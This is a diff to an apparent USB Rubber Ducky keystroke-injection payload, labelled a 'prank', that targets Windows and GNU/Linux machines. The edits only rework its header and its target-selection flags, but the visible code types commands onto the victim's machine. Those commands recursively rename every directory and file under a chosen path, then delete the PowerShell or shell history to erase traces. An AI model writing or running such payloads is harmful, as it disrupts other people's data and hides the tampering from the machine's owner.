@@ -1,13 +1,13 @@
 REM_BLOCK
-#################################################
-#                                               #
-# Title        : Rename Everything Similarly    #
-# Author       : Aleff                          #
-# Version      : 1.0                            #
-# Category     : Prank                          #
-# Target       : Windows 10/11; GNU/Linux       #
-#                                               #
-#################################################
+#############################################
+#                                           #
+# Title        : Same File Name Prank       #
+# Author       : Aleff                      #
+# Version      : 1.0                        #
+# Category     : Prank                      #
+# Target       : Windows 10/11; GNU/Linux   #
+#                                           #
+#############################################
 END_REM
 
 REM I am very sorry not to be able to release scripts for macOS systems as well but unfortunately not having one would be too risky to test it in a VM, at least in my opinion, so if someone from the community wants to contribute they could propose a pull request with the macOS version so that we can integrate it and make this payload cross-platfom.
@@ -31,12 +31,15 @@ REM_BLOCK
 END_REM
 DEFINE #DIRECTORY_WHERE_TO_RUN_THE_COMMAND .
 
-REM leave it TRUE if you want to run this script into a target that use Windows as OS, else if you want to run this script into a GNU/Linux system you must change it to FALSE.
-DEFINE #TRUE_IF_THE_TARGET_IS_WINDOWS_ELSE_FALSE TRUE
+REM Set TARGET_WINDOWS to TRUE if the script will run on a Windows system.
+REM Set TARGET_LINUX to TRUE if the script will run on a GNU/Linux system.
+DEFINE #TARGET_WINDOWS TRUE
+DEFINE #TARGET_GNU_LINUX FALSE
 
 REM %%%%% PAYLOAD-SECTION %%%%%
 
-IF_DEFINED_TRUE #TRUE_IF_THE_TARGET_IS_WINDOWS_ELSE_FALSE
+IF (( #TARGET_WINDOWS == TRUE) && (#TARGET_GNU_LINUX == FALSE)) THEN
+REM %%%%% WINDOWS CODE %%%%%
 
     REM_BLOCK
         Credits:    Hak5 LLC
@@ -132,7 +135,8 @@ IF_DEFINED_TRUE #TRUE_IF_THE_TARGET_IS_WINDOWS_ELSE_FALSE
         $counter = 1; Rename-Directories -path $basePath -counter ([ref]$counter); $counter = 1; Rename-Files -path $basePath -counter ([ref]$counter); Remove-Item (Get-PSReadlineOption).HistorySavePath; exit
     END_STRINGLN
 
-ELSE_DEFINED
+ELSE IF (( #TARGET_WINDOWS == FALSE) && (#TARGET_GNU_LINUX == TRUE)) THEN
+REM %%%%% GNU/LINUX CODE %%%%%
 
     REM_BLOCK
         Credits:    Hak5 LLC
@@ -215,4 +219,4 @@ ELSE_DEFINED
 
         counter=1; rename_directories "$base_path" $counter; counter=1; rename_files "$base_path" $counter; rm $HISTFILE; exit
     END_STRINGLN
-END_IF_DEFINED
+END_IF
